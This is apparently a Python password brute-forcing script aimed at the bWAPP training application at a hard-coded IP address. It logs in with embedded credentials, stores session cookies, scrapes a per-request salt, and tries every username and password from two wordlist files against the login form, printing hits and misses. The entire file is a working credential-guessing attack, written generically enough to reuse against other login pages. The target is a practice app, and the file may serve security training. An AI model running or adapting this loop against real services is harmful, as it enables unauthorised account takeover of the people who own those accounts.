#!/usr/bin/evn python
# -*- coding: utf-8 -*-

import requests
import re
import bs4
import time
import itertools as its
from urllib import request
from http import cookiejar
from urllib import error
from urllib import parse

try:
    import cookielib
except:
    import http.cookiejar as cookielib

headers1 = {'Host': '101.198.180.117',
           'Referer': 'http://101.198.180.117/bWAPP/login.php',
           'Content-Type': 'application/x-www-form-urlencoded',
           'User-Agent': 'Mozilla/5.0 (Windows NT 20.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.226 Safari/537.36 Edge/25.25063'
           }

headers2 = {'Host': '101.198.180.117',
           'Referer': 'http://101.198.180.117/bWAPP/ba_pwd_attacks_2.php',
           'Content-Type': 'application/x-www-form-urlencoded',
           'User-Agent': 'Mozilla/5.0 (Windows NT 20.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.226 Safari/537.36 Edge/25.25063'
           }

# 使用cookie登录信息
session = requests.session()  # session
session.cookies = cookielib.LWPCookieJar(filename='cookies')

try:
    session.cookies.load(ignore_discard=True)

    print('成功加载cookie!')
except:
    print("cookie 未能加载!")

post_url = 'http://101.198.180.117/bWAPP/login.php'

Login_Data = {
    'login':'college',
    'password':'360College',
    'security_level':'0',
    'form':'submit'
}

login_page = session.post(post_url, data=Login_Data, headers=headers1)

# 保存cookies
try:
    session.cookies.save()
    print ('cookies保存成功!')
except Exception as e:
    print (e)

print ('登录成功，开始破解!')

url = 'http://101.198.180.117/bWAPP/ba_pwd_attacks_2.php'


with open('users.txt','r') as users:

    for user in users.readlines():
        with open('passwords.txt','r') as passwords:
            for password in passwords.readlines():
                # find salt
                data = session.get(url, headers=headers2).content
                salt_parm = r'<input type="hidden" id="salt" name="salt" value="(.*)" />'
                salt = re.findall(salt_parm,str(data))
                salt = ''.join(salt)

                Login_Data = {
                    'login':user.replace('\n',''),
                    'password':password.replace('\n',''),
                    ''
                    'salt':salt,
                    'form':'submit'
                    }
                data = session.post(url, data=Login_Data,headers=headers2).content
                result_parm = 'Successful'
                result = re.findall(result_parm,str(data))
                if result:
                    print ('[+]登陆成功！！！')
                    print ('正确用户名：{0} 密码：{1}'.format(Login_Data['login'],Login_Data['password']))
                    break
                else:
                    print ('[-]登陆失败！！！')
                    print ('[-]尝试使用用户名：{0} 密码：{1}'.format(Login_Data['login'],Login_Data['password']))
















